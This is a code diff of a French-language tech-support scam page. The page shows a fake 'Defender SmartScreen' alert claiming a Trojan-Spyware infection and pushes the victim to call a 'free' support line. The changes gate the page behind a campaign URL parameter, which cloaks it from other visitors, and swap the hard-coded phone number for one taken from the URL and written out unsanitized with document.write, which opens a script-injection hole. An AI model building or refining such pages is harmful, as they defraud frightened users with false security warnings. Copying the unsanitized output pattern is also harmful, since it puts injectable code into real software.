@@ -1,3 +1,7 @@
+<?php
+if ($_REQUEST['site_source']=='campaign'){
+?>
+	
 <!doctype html>
 <html lang="es">
 <head>
@@ -31,6 +35,7 @@
             }
         }
     </script>
+	
    <script type="text/javascript">
         function getVariableFromURl(name) {
             name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
@@ -43,13 +48,9 @@
                 return results[1];
         }
         var phone = getVariableFromURl('phone');
-      //  var phone_number = phone + ' (Toll Free)';
+        var phone_number = phone;
       //  var phone_number2 = phone + ' (Toll Free)';
     </script>
-<script type="text/javascript">
-        var phone_number = '910-971-803';
-        // var phone_number = '919-610-587';
-</script>
 
 
 <script>
@@ -593,8 +594,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             </div>
         </div>
         <div class="col-md-12">
-            <marquee width="100%" direction="left" height="100px"><small class="text-left"
-                                                                         style="color: #eee;font-size: 18px;">Defender SmartScreen va vous aider a empêché les application non reconnue de s'afficher. L'exécution de cette application peut mettre votre PC
+            <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 18px;">Defender SmartScreen va vous aider a empêché les application non reconnue de s'afficher. L'exécution de cette application peut mettre votre PC
                      en danger. Smart Defender Scan a détecté sur cet appareil un logiciel publicitaire potentiellement indésirable susceptible de voler
                      vos mots de passe, votre identité en ligne, vos informations financières, vos fichiers personnels, vos photos ou
                      documents.</small></marquee>
@@ -611,11 +611,12 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
     <div id="txtintro">
                 <span class="colo-rd">App: Ads.financetrack(2).dll<br>
                 Threat-Detected:  Trojan-Spyware</span>
-                <span class="colo-rd">
+                   <!-- <span class="colo-rd">
                     <div id="ip_add"></script></div>
                     <div id="city"></script></div>
                     <div id="isp"></script></div>
                   </span>
+	    	-->
     </div>
 
     <div id="disclaimer">
@@ -623,9 +624,10 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
         
 
         <span class="support" style="font-size:22px;">Appelez gratuitement l'assistance Smart Defender:&nbsp; 
-        <img src="phone1.png"style="width: 200px;" id="banner">
-        <!--<span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> <script>document.write(phone_number)</script> -->
-        
+        <!--<img src="phone1.png"style="width: 200px;" id="banner">-->
+	<br />
+        <span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> <script>document.write(phone_number)</script></span>
+        <br />
 	(Ligne sans frais)
 	<br /><span style="color: green">ASSISTANCE 100% GRATUITE</span>
 	</span>
